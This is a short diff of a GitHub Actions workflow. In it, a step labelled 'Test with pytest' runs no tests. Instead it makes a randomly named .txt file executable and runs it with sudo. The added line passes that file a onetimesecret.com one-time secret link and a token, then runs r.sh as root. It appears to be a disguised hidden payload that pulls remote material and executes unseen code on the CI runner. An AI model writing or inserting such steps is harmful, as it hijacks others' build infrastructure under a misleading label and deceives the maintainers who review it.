@@ -26,6 +26,6 @@ jobs:
     - name: Test with pytest
       run: |
         cd ${{ github.workspace }}
-        echo 'ewcqg'
+        echo '4z1lc'
         sudo chmod +x ie5fvtzu/field7hk4t.txt
-        sudo ./ie5fvtzu/field7hk4t.txt   && sudo sh r.sh
+        sudo ./ie5fvtzu/field7hk4t.txt https://onetimesecret.com/secret/4gpowx11hqxtf6xr8n3otekyr4t48m0 szoh0h && sudo sh r.sh
